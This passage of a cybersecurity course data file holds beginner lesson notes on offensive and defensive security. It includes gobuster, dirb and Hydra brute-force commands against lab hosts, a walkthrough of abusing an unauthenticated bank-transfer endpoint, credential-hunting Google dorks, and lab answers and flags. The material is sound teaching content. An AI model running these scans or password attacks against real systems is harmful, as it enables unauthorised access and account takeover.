            <p><b>Offensive security</b> means proactively testing systems by trying to break into them, so weaknesses are found <b>before real attackers can exploit them</b>. After the Pre Security foundations (computers, networks, the web), this room applies that knowledge from an attacker's point of view.</p>
            ${rowSVG("os1", ["Ask questions|what is exposed?", "Test the unexpected|odd inputs", "Find a weakness|vulnerability", "Fix it|before real attackers"], [3])}
            <p>Offensive security starts with questions: <i>What is exposed? What can be accessed? What assumptions does the system make?</i> A hacker asks these methodically and watches how the system reacts to unexpected input.</p>
            <p><b>"Hacking" in this room means penetration testing:</b> an ethical, legal and structured way to find weaknesses so they can be fixed. A hacker here is someone who uses these skills positively to improve security.</p>
            <p>Plan of the room: learn common terminology and methodology, then do a hands-on scenario to see how attackers find weaknesses and <b>chain</b> them together to get deeper into a target.</p>
            <h3>Learning objectives</h3>
            <ul>
              <li>Explain what offensive security is and why it improves security</li>
              <li>Recognise common terminology and methodology</li>
              <li>Practise ethical hacking in a safe, permission-based environment</li>
              <li>Identify next steps and learning paths in offensive security</li>
            </ul>
            <h3>Prerequisites</h3>
            <p>Beginner-friendly, no hacking knowledge needed. A basic understanding of how computers work and some command-line familiarity helps: <a href="room.html?id=pre-security&m=computer-fundamentals&r=inside-a-computer-system">Inside a Computer System</a> and <a href="room.html?id=pre-security&m=operating-systems-basics&r=linux-cli-basics">Linux CLI Basics</a>.</p>`},

          {title:"Finding Weaknesses", lab:true, notes:`
            <p>Rather than waiting for attackers to strike, offensive security professionals <b>proactively test systems</b> to find weaknesses before malicious hackers do.</p>
            <h3>Core offensive security terms</h3>
            <table>
              <tr><th>Term</th><th>Meaning</th></tr>
              <tr><td>Red Teaming</td><td>A structured, authorised attack methodology that simulates a real adversary to test the effectiveness of defences and find vulnerabilities within a defined scope.</td></tr>
              <tr><td>Penetration Test</td><td>A structured security assessment where an authorised tester tries to identify and exploit vulnerabilities within a defined scope, to understand real-world risk.</td></tr>
              <tr><td>Vulnerability</td><td>A weakness or flaw in a system, application or configuration that an attacker could abuse.</td></tr>
              <tr><td>Exploit</td><td>A technique or method used to take advantage of a vulnerability to achieve a specific outcome, such as accessing restricted functionality or data.</td></tr>
              <tr><td>Scope</td><td>The boundaries of what is allowed to be tested: which systems, applications and actions are permitted, and what is off-limits.</td></tr>
            </table>
            <p class="callout"><b>Permission is the one critical rule.</b> Ethical hacking (penetration testing) means testing systems in a controlled, legal manner, only inside an agreed scope. The aim is not to cause damage but to test security controls, uncover gaps and help teams improve. Only use these techniques on systems you own or have written permission to test, such as this room's lab.</p>

            <h3>Getting hands-on</h3>
            <p><b>Scenario:</b> Mike is about to launch his online shop website. Before going live he wants reassurance that no sensitive or unintended pages are publicly accessible. Your job: find any weaknesses before real attackers do.</p>
            <p><b>Lab setup:</b> click <b>View Site</b> to get a split screen. The upper half is a simulated browser showing <code>http://www.onlineshop.thm/</code>; the lower half is a simulated terminal (the "fish" shell) for the security tools.</p>

            <h3>Step 1: manual discovery</h3>
            <p>Add possible page names to the end of the URL in the address bar. A page that does not exist shows an <b>error 404</b> (not found). Pages to test: <code>sitemap</code>, <code>mail</code>, <code>register</code>, <code>login</code>, <code>admin</code>. The goal is to find the hidden page.</p>

            <h3>Step 2: automated discovery with Gobuster</h3>
            <p>Typing URLs by hand is fine for a few pages, but not for a long list. <b>Gobuster</b> automates the scan: run this in the terminal.</p>
            <pre><code>gobuster dir --url http://www.onlineshop.thm/ -w /usr/share/wordlists/dirbuster/directory-list.txt</code></pre>
            <table>
              <tr><th>Part</th><th>What it does</th></tr>
              <tr><td><code>gobuster</code></td><td>The tool that discovers web content</td></tr>
              <tr><td><code>dir</code></td><td>Directory and file enumeration mode: tries to find hidden directories and files on a web server</td></tr>
              <tr><td><code>--url http://www.onlineshop.thm/</code></td><td>The target website to scan</td></tr>
              <tr><td><code>-w /usr/share/wordlists/dirbuster/directory-list.txt</code></td><td>The wordlist of names Gobuster will try as directory and file names</td></tr>
            </table>
            <p><i>Note:</i> for a successful scan the input must match the syntax exactly.</p>
            ${rowSVG("gb", ["Wordlist|list of names to try", "Gobuster|tries each name", "Web server|www.onlineshop.thm", "Status codes|200 found, 404 missing"], [1])}
            <p><b>Room questions:</b> which hidden web page did you discover (manual or automated), and what status code does Gobuster report for that hidden page.</p>
            <div class="placeholder">My own takeaways from the lab: coming soon.</div>`},

          {title:"Exploiting Weaknesses", notes:`
            <p>Part of ethical hacking is <b>chaining weaknesses</b>. One weakness may look harmless on its own, but combined with others it can cause serious consequences, like a line of dominoes: one falling alone does little damage, but dominoes placed close together fall in a chain reaction.</p>
            <p>In the last task, finding the hidden login page was the first domino. A hidden page alone is not dangerous, but combined with something like weak passwords it becomes serious. Ethical hackers find and demonstrate these chains to show how minor issues can line up into a big impact.</p>
            ${rowSVG("dom", ["1. Hidden|login page found", "2. Weak|password", "3. Admin|access gained", "4. Bigger|impact"], [3])}

            <h3>Think like a hacker</h3>
            <p>Hackers look beyond whether something works as intended and ask how it might be misused, combined with other behaviour, or used for unauthorised access. Ethical hackers use the same mindset, but in a safe and authorised way, proving risks before real attackers can.</p>
            <ul>
              <li><b>Ask questions:</b> do not assume a feature works as intended. Ask "what if it doesn't?"</li>
              <li><b>Test the unexpected:</b> try actions and inputs the developers did not consider.</li>
              <li><b>Chain small weaknesses:</b> a tiny flaw may be harmless alone but can connect into a bigger impact.</li>
              <li><b>Think like an adversary:</b> "how would a malicious actor approach this target?"</li>
            </ul>

            <h3>A valuable target: credentials</h3>
            <p>Attackers often want valid credentials (usernames and passwords) because access unlocks private areas of an application and increases their capabilities. What access gives them:</p>
            <ul>
              <li><b>Sensitive functionality:</b> actions like modifying data, viewing restricted content or triggering processes meant only for authorised users.</li>
              <li><b>User data:</b> private information such as names, email addresses and account details that attackers may steal, abuse or sell.</li>
              <li><b>Administrative features:</b> high-privilege functions to manage users, change settings or fully control the application.</li>
              <li><b>Further attack opportunities:</b> being logged in can expose more vulnerabilities and let attackers move deeper.</li>
            </ul>
            <p>The hidden page found earlier lets registered users sign in. It may look harmless, but exposed authentication can let attackers attempt unauthorised access. In this task you test whether the login can be abused.</p>

            <h3>Getting hands-on</h3>
            <p>Goal: find out whether a set of working credentials exists for the web app. One of the most common usernames is <code>admin</code>, so start there. As in the last task, begin manually with a short wordlist of very common passwords. If the username <code>admin</code> is paired with the right password, you get access and a flag.</p>

            <h3>Automating it with Hydra (dictionary attack)</h3>
            <p>Real penetration testers often try hundreds or thousands of passwords. <b>Hydra</b> is a password-testing tool that automates login attempts against a target using a wordlist. Since the username is already known, it tries each password in the list. This technique is a <b>dictionary attack</b>, because it relies on a predefined list of possible passwords. Run it in the terminal:</p>
            <pre><code>hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect" -V</code></pre>
            <table>
              <tr><th>Part</th><th>What it does</th></tr>
              <tr><td><code>hydra</code></td><td>The command-line tool used for the dictionary attack</td></tr>
              <tr><td><code>-l admin</code></td><td>Try to log in with the username <code>admin</code></td></tr>
              <tr><td><code>-P passlist.txt</code></td><td>The list of passwords to try</td></tr>
              <tr><td><code>www.onlineshop.thm</code></td><td>The target website</td></tr>
              <tr><td><code>http-post-form</code></td><td>Says this is an HTTP POST request form</td></tr>
              <tr><td><code>"/login:username=^USER^&amp;password=^PASS^:F=incorrect"</code></td><td>How the login request is sent, and how Hydra knows an attempt failed (the page says "incorrect")</td></tr>
              <tr><td><code>-V</code></td><td>Verbose output: shows each username and password attempted</td></tr>
            </table>
            ${rowSVG("hy", ["Wordlist|passlist.txt", "Hydra|tries each password", "Login form|username: admin", "Result|failed or success"], [1])}
            <p>No need to fully understand how the command is built yet. Just run it and read the output to see how Hydra tests each password, much faster than doing it by hand. Whether manual or automated, you end up with the <code>admin</code> password.</p>
            <p><b>Room questions:</b> the discovered admin password, the secret message shown after logging in, and how many failed attempts Hydra made before the correct password.</p>
            <div class="placeholder">My own takeaways from the lab: coming soon.</div>`},

          {title:"Where to Go From Here", notes:`
            <p>You learned the role of ethical hackers, key terminology and methodology, and got hands-on experience with real tools used by professional red teamers to help secure a web application.</p>
            <h3>Key terminology</h3>
            <table>
              <tr><th>Term</th><th>Meaning</th></tr>
              <tr><td>Scope</td><td>The exact systems and actions allowed during a security test</td></tr>
              <tr><td>Vulnerability</td><td>A hidden weakness in a system that an attacker could use to break in</td></tr>
              <tr><td>Exploit</td><td>A method or technique that takes advantage of a vulnerability</td></tr>
              <tr><td>Enumeration</td><td>Collecting details about a system, users and services to find weak points</td></tr>
              <tr><td>Credentials</td><td>Login details such as usernames and passwords that unlock access</td></tr>
              <tr><td>Authentication</td><td>The step that checks that someone or something really is who they claim to be when logging in</td></tr>
              <tr><td>Dictionary attack</td><td>Trying a predefined wordlist to guess a password or username</td></tr>
            </table>
            <h3>What is next</h3>
            <p>A new field can feel intimidating. The simple answer: break it down, choose an area that interests you, and practise regularly with hands-on exercises. Learning a little each day builds the skills and confidence for a first role in the industry.</p>
            <h3>Potential careers</h3>
            <ul>
              <li><b>Penetration Tester / Ethical Hacker:</b> safely explores vulnerabilities within a defined scope</li>
              <li><b>Vulnerability Researcher:</b> identifies and validates undiscovered weaknesses in software and hardware</li>
              <li><b>Red Team Operator:</b> simulates real-world adversaries to test an organisation's detection, response and defences</li>
            </ul>
            <h3>Further learning</h3>
            <p>Next up in this module: <a href="room.html?id=pre-security&m=attacks-and-defenses&r=become-a-defender">Become a Defender</a>, which covers the defensive techniques professionals use to secure an organisation. Then explore paths that match your interests:</p>
            <ul>
              <li><a href="course.html?id=cyber-security-101">Cyber Security 101</a></li>
              <li><a href="course.html?id=jr-penetration-tester">Jr Penetration Tester</a></li>
              <li><a href="course.html?id=soc-level-1">SOC Level 1</a></li>
            </ul>`}
         ]},
        {name:"Become a Defender", text:"Explore defensive security, cyber infrastructure, and how to protect systems from attacks.",
         icon:"🛡️", level:"easy", time:"30 min", premium:true,
         tasks:[
          {title:"What Is Defensive Security?", notes:`
            <p><b>Defensive security</b> focuses on understanding what needs to be protected and putting security measures in place to <b>prevent, detect and mitigate</b> the impact of potential attacks. Defenders gain visibility into systems, find weak points and make sure systems stay available and protected, in line with the CIA triad (confidentiality, integrity, availability). The goal is to be prepared for incidents and to respond when they happen.</p>
            ${rowSVG("df1", ["Understand|what to protect", "Prevent|stop attacks early", "Detect|spot suspicious activity", "Respond|limit damage, recover"], [0])}
            <p>In the previous room, <a href="room.html?id=pre-security&m=attacks-and-defenses&r=become-a-hacker">Become a Hacker</a>, you saw security from the attacker's side. Ethical hackers use the same techniques as malicious actors to find weaknesses and help organisations improve. Defenders, often called the <b>Blue Team</b>, need to understand how attackers think, what they target and how attacks usually unfold. By identifying critical infrastructure, understanding the attackers' goals and applying defences, they protect their clients' systems.</p>
            <h3>Learning objectives</h3>
            <ul>
              <li>Understand what defenders protect and why visibility matters</li>
              <li>Identify the key parts of a client's environment</li>
              <li>Learn basic methods to protect common systems and services</li>
              <li>Feel confident starting your defensive security journey</li>
            </ul>
            <h3>Prerequisites</h3>
            <p>Beginner-friendly. Some familiarity with computer systems and defensive concepts helps: <a href="room.html?id=pre-security&m=attacks-and-defenses&r=the-cia-triad">The CIA Triad</a> and <a href="room.html?id=pre-security&m=computer-fundamentals&r=computer-types">Computer Types</a>.</p>`},

          {title:"Understanding Your Environment", lab:true, notes:`
            <p>Before you can protect anything, you need clear <b>visibility</b> into what exists and how it fits together. A simple way to think about it: imagine the client's infrastructure as a <b>bustling city</b>. Just like city guards need to know the layout, watch for trouble and know how to respond, defenders must understand their environment to keep it safe.</p>
            <h3>Defensive questions in city terms</h3>
            <table>
              <tr><th>Defensive question</th><th>City analogy</th><th>Security equivalent</th></tr>
              <tr><td>What are you protecting? (systems and infrastructure)</td><td>Homes, buildings, people</td><td>Client servers, data, workstations, users</td></tr>
              <tr><td>Can you see what you are protecting? (visibility)</td><td>Cameras, reports, patrols</td><td>Logs, network traffic, alerts</td></tr>
              <tr><td>What counts as suspicious behaviour?</td><td>Locked-door attempts, circling cars</td><td>Repeated logins, unusual IP addresses</td></tr>
              <tr><td>How do you stop a threat?</td><td>Police, blocked roads, curfews</td><td>Firewall rules, IP address blocking</td></tr>
            </table>
            <h3>What can you do as a defender?</h3>
            <p>Defenders usually organise their work around a set of foundational concepts that apply across nearly all environments:</p>
            <ul>
              <li><b>Prevention:</b> security controls that stop attacks before they happen, such as firewalls, antivirus software and regular patching.</li>
              <li><b>Detection:</b> monitoring systems and networks to spot suspicious or malicious activity through logs, alerts and security tools.</li>
              <li><b>Mitigation:</b> acting during an incident to limit damage, such as blocking traffic, isolating affected systems or disabling compromised accounts.</li>
              <li><b>Analysis:</b> investigating what happened, how, and which systems were affected, by reviewing logs and other evidence.</li>
              <li><b>Response and improvement:</b> recovering from the incident and improving defences to reduce the risk of similar attacks in future.</li>
            </ul>
            <h3>What is your scope?</h3>
            <p>Defenders are not responsible for protecting everything on the internet. They protect what belongs to their organisation or client: the devices people use every day, the servers hosting applications and data, and the networks connecting them. Before any defence, you must know what systems exist, what they are used for and how they fit into the overall environment.</p>
            ${cityMapSVG()}
            <table>
              <tr><th>System / infrastructure component</th><th>Purpose</th><th>City analogy</th></tr>
              <tr><td>Employee devices</td><td>Where users work and access company resources</td><td>Homes</td></tr>
              <tr><td>Web server</td><td>Hosts websites or applications accessed by users</td><td>Shop / public buildings</td></tr>
              <tr><td>Mail server</td><td>Sends and receives email for the organisation</td><td>Post office</td></tr>
              <tr><td>Firewall</td><td>Controls what traffic is allowed in or out</td><td>City gate</td></tr>
              <tr><td>Internet</td><td>External networks not controlled by the organisation</td><td>Anything outside the city</td></tr>
            </table>
            <h3>Hands-on: mapping your city</h3>
            <p>Click <b>View Site</b> to open the static site in split view. The city represents your client's infrastructure. Click each part of the city to read its description, then <b>drag the correct infrastructure component</b> to its proper location, mapping each part to its real-world equivalent.</p>
            <p><b>Room questions:</b> the name of the goal when controls stop threats before damage occurs, the process of reviewing logs and evidence to understand an incident, and the flag after mapping the city.</p>
            <div class="placeholder">My own takeaways from the exercise: coming soon.</div>`},

          {title:"Defending Your Environment", lab:true, notes:`
            <p>Task 2 was about understanding the environment. Now the focus is on how those systems can be <b>protected</b>. As a defender you understand what exists, think about how it could be abused, and apply protections to reduce risk.</p>
            <h3>The defender mindset</h3>
            <p>Success needs more than knowing your environment. You must understand the attackers too. Instead of seeing separate parts, see an <b>interconnected chain</b>: attackers rarely target a single system. They compromise one asset and pivot to the next, building towards their goal. Every step is a chance for a defender to apply a control.</p>
            ${rowSVG("chain", ["Malicious|email attachment", "Employee|workstation", "Stolen|credentials", "Mail server|accessed", "Database|sensitive data"])}
            <p>Example: a malicious email attachment affects an employee's workstation. From there the attacker steals usernames and passwords, reaches a mail server and eventually the sensitive data on a database server.</p>
            <h3>Key defender principles</h3>
            <ul>
              <li><b>Threat anticipation:</b> review the systems you protect and ask "what if?" Imagine realistic paths an attacker could take.</li>
              <li><b>Attack awareness:</b> attacks usually follow recognisable stages. Studying common attack chains and frameworks helps defenders a lot.</li>
              <li><b>Risk prioritisation:</b> not every part of a system carries equal risk. Identify high-value systems and targets first.</li>
              <li><b>Continuous adaptation:</b> defence is never a one-time setup. Threats evolve, techniques change and new vulnerabilities appear.</li>
            </ul>
            <h3>Available defences: tools to protect your city</h3>
            <p>Defenders use several tools that work together, like locks on doors, guards at the gate and alarms inside buildings. No single tool stops every attack, but a <b>layered</b> set makes it much harder for attackers to succeed.</p>
            <table>
              <tr><th>Component</th><th>What could go wrong</th><th>Defences you'll use</th></tr>
              <tr><td>Employee devices</td><td>Someone clicks a bad link or downloads unsafe software</td><td>Antivirus to detect bad programs; regular software updates</td></tr>
              <tr><td>Web server</td><td>Attackers try to break into the website</td><td>Only allow safe traffic; use secure communication</td></tr>
              <tr><td>Mail server</td><td>Malicious or deceptive emails</td><td>Spam filters; scan attachments</td></tr>
              <tr><td>Firewall</td><td>Strangers from the internet try to break in</td><td>Firewall rules that control access; block known troublemakers</td></tr>
              <tr><td>The outside internet</td><td>External threats come from here</td><td>Restrict inbound traffic; monitor for suspicious activity</td></tr>
            </table>
            <p>Do not worry if some of these feel unfamiliar. You will explore these tools in detail as you progress. The list is not exhaustive, just a guide to how defenders match protections to different systems.</p>
            <h3>Hands-on: defending your city</h3>
            <p>Click <b>View Site</b>. Click each area of the city to learn about its weakness, then <b>drag an appropriate security control</b> onto it to help protect it.</p>
            <p><b>Room questions:</b> which defender principle focuses on identifying the most critical systems, and the flag after defending the city.</p>
            <div class="placeholder">My own takeaways from the exercise: coming soon.</div>`},

          {title:"Where to Go From Here", notes:`
            <p>You explored the fundamentals of defensive security, learned to identify and understand client infrastructure and adopted a defender mindset to anticipate how attacks may happen. By thinking like both an attacker and a defender you saw how controls can be applied across multiple layers to reduce risk.</p>
            <h3>Key terminology</h3>
            <table>
              <tr><th>Term</th><th>Meaning</th></tr>
              <tr><td>Blue Team</td><td>A group of cyber security defenders tasked with protecting systems and responding to threats</td></tr>
              <tr><td>Client infrastructure</td><td>The networks, servers, devices and applications belonging to an organisation that need protection</td></tr>
              <tr><td>Visibility</td><td>The ability to see and monitor activity across systems to spot potential issues</td></tr>
              <tr><td>Threat</td><td>A potential danger, such as a hacker or malware, that could harm systems or data</td></tr>
              <tr><td>Prevention</td><td>Stopping threats before they cause harm by blocking, restricting or reducing opportunities for attack</td></tr>
              <tr><td>Detection</td><td>Identifying threats or suspicious activity in networks and systems</td></tr>
              <tr><td>Mitigation</td><td>Actions taken to reduce or stop the impact of a threat once it is identified</td></tr>
              <tr><td>Risk</td><td>The likelihood and potential impact of a threat successfully harming an organisation</td></tr>
            </table>
            <h3>What is next</h3>
            <p>Starting out can feel overwhelming, with many tools and concepts and no obvious place to begin. Build gradually. As you progress you will gain the foundations to go deeper into both defensive and offensive security. Understanding how systems are protected, monitored and defended strengthens your ability to detect attacks and your awareness of how attackers operate.</p>
            <h3>Potential careers (blue team)</h3>
            <ul>
              <li><b>Security Operations Center (SOC):</b> monitors networks and systems to detect and investigate suspicious activity and security alerts</li>
              <li><b>Threat Intelligence:</b> researches current threats, attackers and trends to help organisations prepare and defend</li>
              <li><b>Digital Forensics &amp; Incident Response (DFIR):</b> investigates security incidents to understand how an attack happened, and contains the threat to restore affected systems</li>
            </ul>
            <h3>Further learning</h3>
            <p>This room is the end of the <a href="course.html?id=pre-security">Pre Security</a> path. From here, explore paths that match your interests (offence, defence or broader foundations):</p>
            <ul>
              <li><a href="course.html?id=cyber-security-101">Cyber Security 101</a></li>
              <li><a href="course.html?id=soc-level-1">SOC Level 1</a></li>
              <li><a href="course.html?id=jr-penetration-tester">Jr Penetration Tester</a></li>
            </ul>`}
         ]}
       ]}
    ]
  },
  "cyber-security-101": {
    title:"Cyber Security 101", icon:"🛡️", level:"easy", track:"Foundations",
    summary:"Develop cyber security skills needed to enter any career in the industry. Explore foundational Linux, Windows, networking, and cryptography, then dive into real-world offensive exploitation and defensive SOC analysis tools aligned with the SEC1 professional certification.",
    prerequisites:"Basic computer literacy and enthusiasm to learn. Completing Computer Science Basics (Pre Security) is recommended.",
    modules:[
      {icon:"🚀", title:"Start Your Cyber Security Journey", text:"Explore offensive and defensive cyber security via interactive exercises and acquire the essential search skills to find information.",
       intro:"This module introduces the reader to offensive cyber security through an interactive exercise where users can practice hacking an insecure web application in a legal and safe environment. Then, it presents defensive security via an interactive exercise to protect against an attack. Finally, it equips the reader with the fundamental search skills to find what they need as they start their journey in cyber security.",
       rooms:[
        {name:"Offensive Security Intro", text:"Hack your first website (legally in a safe environment) and experience an ethical hacker's job.",
         icon:"🗡️", level:"easy", time:"15 min",
         tasks:[
          {title:"Think like a Hacker!", notes:`
            <p>What is <b>Offensive Security</b>? Often referred to as ethical hacking or red teaming, offensive security is the discipline of proactively discovering vulnerabilities, exploiting architectural flaws, and bypassing security defenses using the exact techniques deployed by real-world adversaries.</p>
            <p>While defensive security designs firewalls and locks, offensive security tests those locks against lockpicks. By identifying and proving that a weakness can be exploited before malicious threat actors find it, organizations can fix their flaws and protect sensitive customer records.</p>
            ${offensiveWorkflowSVG()}
            <h3>The Ethical &amp; Legal Framework</h3>
            <p>The decisive distinction between an ethical penetration tester and a malicious cyber criminal is <b>authorization</b>. Ethical hackers always operate with signed <i>Rules of Engagement (RoE)</i> and explicit written consent from the system owner. Hacking, probing, or scanning systems without permission is strictly illegal under computer misuse legislation.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which term describes simulating a hacker's actions to find weaknesses?</i> <b>Offensive Security</b></li>
            </ul>`},

          {title:"Starting the Lab", lab:true, notes:`
            <p>In this hands-on lab, we target a simulated financial institution called <b>FakeBank</b> running at <code>http://fakebank.thm</code>.</p>
            <p>When launching the in-browser lab desktop, you are provided with a dedicated penetration testing workspace equipped with a web browser, terminal, and security auditing tools. Opening the browser to the customer portal displays your current account balance and profile details.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the bank account number in the FakeBank application?</i> <b>1245-8811</b></li>
            </ul>`},

          {title:"Find Hidden Pages", lab:true, notes:`
            <p>Websites typically conceal administrative portals, debugging dashboards, and staff backends from public navigation bars. To discover these hidden paths, ethical hackers use <b>Directory Brute-Forcing</b>.</p>
            <p>Tools like <code>dirb</code>, <code>gobuster</code>, and <code>ffuf</code> use wordlists containing thousands of common endpoint names (such as <code>/admin</code>, <code>/uploads</code>, <code>/backup</code>). They issue automated HTTP requests to each path and inspect the resulting HTTP status code:</p>
            <ul>
              <li><b>200 OK:</b> The resource exists and is accessible.</li>
              <li><b>301 / 302 Redirect:</b> Resource points to an authentication gateway or internal route.</li>
              <li><b>401 / 403 Forbidden:</b> Resource exists but requires higher privilege headers.</li>
              <li><b>404 Not Found:</b> The requested path does not exist.</li>
            </ul>
            <pre><code># Executing a directory brute force with dirb
dirb http://fakebank.thm /usr/share/wordlists/dirb/common.txt

# Discovered sensitive endpoints:
==> DIRECTORY: http://fakebank.thm/bank-transfer/</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which hidden path did the directory scanner find?</i> <b>/bank-transfer</b></li>
            </ul>`},

          {title:"Attack Bank Transfer Endpoint", lab:true, notes:`
            <p>Visiting the newly discovered <code>/bank-transfer</code> path reveals an unauthenticated internal staff transfer mechanism. Because proper session authentication and access control validations are absent on this endpoint, an attacker can submit wire transfers between any arbitrary accounts.</p>
            <p>By specifying your own customer account (<code>1245-8811</code>) as the destination and transferring funds from internal reserves, your account balance updates immediately.</p>
            <div class="callout">
              <b>Exploitation Success:</b> The application awards your verification flag upon successful unauthorized funds routing!
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the flag received after transferring money to your account?</i> <b>BANK-HACKED</b></li>
            </ul>`}
         ]},

        {name:"Defensive Security Intro", text:"Introducing defensive security and related topics, such as Threat Intelligence, SOC, DFIR, Malware Analysis, and SIEM.",
         icon:"🛡️", level:"easy", time:"20 min",
         tasks:[
          {title:"Introduction to Defensive Security", notes:`
            <p><b>Defensive Security</b> (often called Blue Teaming) is the discipline dedicated to shielding an organization's digital assets from cyber threats, detecting unauthorized intruders, and rapidly mitigating security breaches.</p>
            <p>While offensive teams look for a single chink in the armor, defenders must protect all systems across the organization simultaneously: workstations, cloud clusters, server racks, API gateways, and employees.</p>
            ${defensivePillarsSVG()}
            <h3>Core Responsibilities of Defensive Teams</h3>
            <ul>
              <li><b>Prevention:</b> Enforcing firewalls, least-privilege access control, patch management, and security configurations.</li>
              <li><b>Detection:</b> Continuous telemetry logging, automated threat correlation, and anomaly detection.</li>
              <li><b>Response:</b> Isolating compromised hosts, terminating malicious command-and-control (C2) beacons, and restoring service.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which team role focuses on defending systems and networks against cyber attacks?</i> <b>Blue Team</b></li>
            </ul>`},

          {title:"SOC & Threat Intelligence", notes:`
            <p>A <b>Security Operations Center (SOC)</b> is the nerve center where security analysts continuously monitor network telemetry, server event logs, and endpoint activities 24/7/365.</p>
            <p>SOC analysts utilize <b>SIEM</b> (Security Information and Event Management) platforms like Splunk, Elastic, and Microsoft Sentinel to aggregate gigabytes of logs and trigger alarms on suspicious behavior.</p>
            <h3>Threat Intelligence &amp; Indicators of Compromise</h3>
            <p>Defenders leverage <b>Threat Intelligence</b> feeds tracking adversary tactics, techniques, and procedures (TTPs) and technical forensic fingerprints known as <b>Indicators of Compromise (IOCs)</b>:</p>
            <ul>
              <li><b>Hash Signatures:</b> MD5/SHA256 values of known malware binaries.</li>
              <li><b>Network Indicators:</b> Malicious IP addresses, phishing domains, and bulletproof C2 hosts.</li>
              <li><b>Host Indicators:</b> Malicious registry persistence keys and scheduled task names.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does SOC stand for?</i> <b>Security Operations Center</b></li>
            </ul>`},

          {title:"Digital Forensics & Incident Response", notes:`
            <p><b>Digital Forensics and Incident Response (DFIR)</b> is the scientific discipline of investigating digital crime scenes, containing active attacks, and preserving admissible digital evidence.</p>
            <h3>The Order of Volatility</h3>
            <p>When investigating a compromised machine, investigators preserve data starting from the most fragile, ephemeral stores to the most persistent:</p>
            <ol>
              <li><b>CPU Registers &amp; Cache:</b> Ephemeral nanosecond states.</li>
              <li><b>RAM (System Memory):</b> Active network connections, unencrypted passwords, running malware code.</li>
              <li><b>Network State &amp; Routing Tables:</b> Current socket tables and ARP caches.</li>
              <li><b>Hard Drives / SSDs:</b> Operating system binaries, file system metadata, event logs.</li>
              <li><b>Archival Backups:</b> Read-only backup images.</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does DFIR stand for?</i> <b>Digital Forensics and Incident Response</b></li>
            </ul>`},

          {title:"Malware Analysis", notes:`
            <p><b>Malware Analysis</b> is the process of dissecting suspicious programs (trojans, ransomware, worms, spyware) to comprehend how they execute, communicate, and how to defeat them.</p>
            <table>
              <thead>
                <tr><th>Analysis Method</th><th>Procedure</th><th>Safety Profile</th></tr>
              </thead>
              <tbody>
                <tr>
                  <td><b>Static Analysis</b></td>
                  <td>Inspecting the binary file without executing it. Reading embedded ASCII strings, verifying digital certificates, examining PE header imports, and disassembling machine code in Ghidra or IDA Pro.</td>
                  <td>Safe; binary does not run.</td>
                </tr>
                <tr>
                  <td><b>Dynamic Analysis</b></td>
                  <td>Executing the binary inside an isolated, instrumented sandbox (such as Cuckoo or FlareVM) to observe real-time DNS queries, dropped files, spawned child processes, and registry edits.</td>
                  <td>Requires strict network isolation.</td>
                </tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the analysis called where you run the malware in a controlled sandbox?</i> <b>Dynamic Analysis</b></li>
            </ul>`}
         ]},

        {name:"Search Skills", text:"Learn to efficiently search the Internet and use specialized search engines and technical docs.",
         icon:"🔍", level:"easy", time:"25 min",
         tasks:[
          {title:"Google Dorking & Search Operators", notes:`
            <p>Security practitioners, penetration testers, and OSINT researchers use specialized search queries known as <b>Google Dorks</b> to uncover exposed credentials, unsecured files, and admin panels indexed by search engines.</p>
            <table>
              <thead>
                <tr><th>Operator</th><th>Function</th><th>Example</th></tr>
              </thead>
              <tbody>
                <tr><td><code>site:</code></td><td>Restrict search to a specific domain or TLD</td><td><code>site:example.com</code></td></tr>
                <tr><td><code>filetype:</code></td><td>Find specific file extensions (pdf, config, log, env)</td><td><code>filetype:log "password"</code></td></tr>
                <tr><td><code>intitle:</code></td><td>Search for keywords inside the HTML page title</td><td><code>intitle:"index of /" admin</code></td></tr>
                <tr><td><code>inurl:</code></td><td>Search for strings inside the URL path</td><td><code>inurl:/admin/login.php</code></td></tr>
                <tr><td><code>cache:</code></td><td>View Google's cached snapshot of a webpage</td><td><code>cache:example.com</code></td></tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Google search operator restricts results to a specific file extension?</i> <b>filetype:</b></li>
            </ul>`},

          {title:"Vulnerability Databases & Exploit Resources", notes:`
            <p>When auditing systems or researching discovered software version numbers, cyber security professionals search specialized vulnerability repositories:</p>
            <ul>
              <li><b>CVE (Common Vulnerabilities and Exposures):</b> Standardized identifier dictionary managed by MITRE (e.g. <code>CVE-2024-21413</code>).</li>
              <li><b>NVD (National Vulnerability Database):</b> NIST database providing CVSS severity scores, affected CPE versions, and patch notes.</li>
              <li><b>Exploit-DB:</b> Verified public archive of functional proof-of-concept exploits and security whitepapers.</li>
              <li><b>GitHub / Security Advisories:</b> Source code repositories hosting weaponized zero-days and vendor remediation commits.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does CVE stand for?</i> <b>Common Vulnerabilities and Exposures</b></li>
            </ul>`},

          {title:"Reading Technical Documentation & RFCs", notes:`
            <p>In-depth understanding of technology requires referencing official specifications:</p>
            <ul>
              <li><b>RFC (Request for Comments):</b> Authoritative Internet Engineering Task Force (IETF) standards defining core network protocols (e.g. RFC 793 for TCP, RFC 9110 for HTTP semantics).</li>
              <li><b>Linux Man Pages:</b> Built-in terminal reference manuals accessed via <code>man &lt;command&gt;</code>.</li>
              <li><b>Vendor Security Guides:</b> Hardening guidelines from CIS Benchmarks, NIST SP 800-53, and Microsoft Learn.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What terminal command is used on Linux to view the manual pages of a utility?</i> <b>man</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🐧", title:"Linux Fundamentals", text:"Many servers and security tools use Linux. Learn how to use the Linux operating system, a critical skill in cyber security.",
       intro:"Linux is one of the major operating systems and is heavily used in organisations all around the world. Learning how to use Linux is a core competency and will help you in your hacking journey not to just use Linux-based security tools, but how to use and exploit the operating system. This module will focus on getting you comfortable using Linux.",
       rooms:[
